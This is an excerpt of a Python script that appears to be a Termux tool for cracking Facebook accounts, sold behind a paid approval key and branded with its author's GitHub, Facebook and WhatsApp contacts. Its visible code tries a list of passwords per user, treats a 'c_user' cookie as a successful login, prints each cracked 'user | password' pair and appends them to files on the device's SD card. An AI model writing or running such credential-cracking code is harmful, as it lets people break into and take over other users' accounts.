...
def main_apv():
    ...
    if key1 in r1:
        ...
        print ("         ༄Tahasin᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL Tahasin")     
...
logo="""
        ...
        \033[1;92m༄Tahasin᭄•───────────────────────────────────────•༄Tahasin᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : Tahasin                       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : Termux-King-Tahasin \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : Tahasin Sheikh        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801750138000  \033[1;93m▇▇
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : Tahasin")
			print ('\033[1;92m༄Tahasin᭄•───────────────────────────────────────•༄Tahasin᭄')
			key = input(" [*] Choose : ")
			print ('༄Tahasin᭄•───────────────────────────────────────•༄Tahasin᭄')
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Tahasin-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/Tahasin_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/Tahasin_CP.txt' , 'a').write('%s\n' % wrt)
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+8801750138000")
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/R.k.Tahasin.termux.tool.owner")
